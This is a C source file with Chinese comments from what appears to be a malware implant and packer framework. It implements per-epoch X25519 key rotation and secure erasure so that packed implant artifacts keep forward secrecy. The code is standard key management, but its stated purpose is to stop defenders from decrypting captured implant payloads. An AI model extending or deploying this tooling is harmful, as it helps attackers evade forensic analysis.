/*
 * DAYANJING v4 — 20_packer / keyrot.c
 *
 * 植入体静态密钥轮换（制品层前向保密的私钥侧）。
 *
 * ====================================================================
 * 为什么需要它
 * ====================================================================
 * v3 制品用 X25519 ephemeral-static 派生种子：
 *   打包方：ss = X25519(e, pk_implant@epoch)，E 进头，e 擦除
 *   植入体：ss = X25519(sk_implant@epoch, E)
 *
 * 这保证了"没有植入体私钥就解不开"，但**单独它并不提供前向保密**：
 * 若 sk_implant 日后泄露，且攻击者完整录制了制品（头里有 E），
 * 就能离线重算 ss —— 历史制品全部可解。
 *
 * 前向保密必须由"私钥不再存在"来兑现。本文件做的就是这个：
 * 每个纪元重新生成静态密钥对，滚出保留窗口的私钥用 secure_zero 擦除。
 *
 * ====================================================================
 * secure_zero 为什么写成 volatile 逐字节
 * ====================================================================
 * 写成 memset(p, 0, n) 是无效的：编译器看到"写完后不再读"，有权把这段
 * 清零整个删掉（dead store elimination）。这里用 volatile 指针逐字节写，
 * 编译器不得优化。这是 PFS 能否兑现的技术前提，不是风格问题。
 *
 * ====================================================================
 * 与 14_p2p/hopkey.c 的关系
 * ====================================================================
 * 机制同构（都是 epoch 轮换 + 保留窗口 + 安全擦除），但：
 *   - 那里服务于洋葱层剥取，靠"逐个 epoch 试错 GCM"定位
 *   - 这里服务于制品种子派生，epoch 明文写在制品头里，可 O(1) 定位
 * 20_packer 不依赖 14_p2p（模块可独立编译），故在此独立实现一份。
 *
 * 密码学复用 00_crypto 的 X25519，不自研第二套。
 */

#include "packer.h"

#include <string.h>

#include "crypto_x25519.h"

static void secure_zero(void *p, size_t n)
{
    volatile uint8_t *q = (volatile uint8_t *)p;
    while (n--) *q++ = 0;
}

int pk_implant_key_init(pk_implant_key_t *k)
{
    uint8_t sk[PK_IMPLANT_SK_LEN];
    uint8_t pk[PK_IMPLANT_PK_LEN];
    int rc;

    if (!k) return PK_ERR_ARG;
    memset(k, 0, sizeof(*k));

    rc = x25519_generate_keypair(sk, pk);
    if (rc != X25519_OK) return PK_ERR_SYS;

    k->slots[0].epoch = 0;
    memcpy(k->slots[0].sk, sk, PK_IMPLANT_SK_LEN);
    memcpy(k->slots[0].pk, pk, PK_IMPLANT_PK_LEN);
    k->n = 1;
    k->next_epoch = 1;

    secure_zero(sk, sizeof(sk));
    return PK_OK;
}

void pk_implant_key_wipe(pk_implant_key_t *k)
{
    int i;

    if (!k) return;
    for (i = 0; i < PK_RETAIN; i++)
        secure_zero(k->slots[i].sk, PK_IMPLANT_SK_LEN);
    secure_zero(k, sizeof(*k));
}

int pk_implant_key_rotate(pk_implant_key_t *k, uint32_t *new_epoch)
{
    uint8_t sk[PK_IMPLANT_SK_LEN];
    uint8_t pk[PK_IMPLANT_PK_LEN];
    int rc;
    int last;

    if (!k || k->n <= 0) return PK_ERR_ARG;

    rc = x25519_generate_keypair(sk, pk);
    if (rc != X25519_OK) return PK_ERR_SYS;

    /*
     * 槽位右移：slots[0] 恒为最新。
     * 若已满，被挤出的是最后一个 —— 其私钥必须在覆盖前擦除，
     * 否则"轮换"只是换了个值，旧密钥仍留在内存里，PFS 形同虚设。
     */
    last = (k->n < PK_RETAIN) ? k->n : (PK_RETAIN - 1);
    if (k->n >= PK_RETAIN) {
        secure_zero(k->slots[PK_RETAIN - 1].sk, PK_IMPLANT_SK_LEN);
        secure_zero(&k->slots[PK_RETAIN - 1], sizeof(k->slots[PK_RETAIN - 1]));
    }

    for (int i = last; i > 0; i--) k->slots[i] = k->slots[i - 1];

    k->slots[0].epoch = k->next_epoch;
    memcpy(k->slots[0].sk, sk, PK_IMPLANT_SK_LEN);
    memcpy(k->slots[0].pk, pk, PK_IMPLANT_PK_LEN);

    if (k->n < PK_RETAIN) k->n++;
    k->next_epoch++;

    secure_zero(sk, sizeof(sk));
    if (new_epoch) *new_epoch = k->slots[0].epoch;
    return PK_OK;
}

int pk_implant_key_pub(const pk_implant_key_t *k,
                       uint8_t out[PK_IMPLANT_PK_LEN])
{
    if (!k || !out || k->n <= 0) return PK_ERR_ARG;
    memcpy(out, k->slots[0].pk, PK_IMPLANT_PK_LEN);
    return PK_OK;
}

int pk_implant_key_has_epoch(const pk_implant_key_t *k, uint32_t epoch)
{
    int i;

    if (!k) return 0;
    for (i = 0; i < k->n; i++)
        if (k->slots[i].epoch == epoch) return 1;
    return 0;
}

int pk_implant_key_forget(pk_implant_key_t *k, uint32_t epoch)
{
    int i;

    if (!k) return PK_ERR_ARG;
    for (i = 0; i < k->n; i++) {
        if (k->slots[i].epoch == epoch) {
            secure_zero(k->slots[i].sk, PK_IMPLANT_SK_LEN);
            secure_zero(&k->slots[i], sizeof(k->slots[i]));
            /* 前移补齐，保持 slots[0..n-1] 连续 */
            for (int j = i; j < k->n - 1; j++) k->slots[j] = k->slots[j + 1];
            k->n--;
            return PK_OK;
        }
    }
    return PK_ERR_ARG;
}
